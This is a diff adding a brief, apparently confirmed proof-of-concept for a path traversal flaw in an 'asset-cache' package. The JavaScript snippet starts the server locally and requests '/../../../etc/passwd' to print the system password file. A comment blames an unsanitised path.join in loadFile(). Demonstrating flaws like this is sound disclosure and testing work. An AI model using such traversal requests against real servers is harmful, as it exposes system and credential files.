@@ -1,0 +1,24 @@
+Confirmed working — the exploit reads `/etc/passwd` via path traversal. Here's the finalized snippet:
+
+```javascript
+const http = require("http");
+const server = require("asset-cache");
+
+// asset-cache's loadFile() does path.join(config.dir, req.url) with
+// zero sanitization of ".." segments, so any client-supplied URL can
+// escape the served directory and read arbitrary files on disk.
+server.listen(4321, () => {
+  http.get(
+    { host: "127.0.0.1", port: 4321, path: "/../../../../../../../etc/passwd" },
+    (res) => {
+      let body = "";
+      res.on("data", (chunk) => (body += chunk));
+      res.on("end", () => {
+        console.log("Status:", res.statusCode);
+        console.log(body); // contents of /etc/passwd leaked
+        server.close();
+      });
+    }
+  );
+});
+```
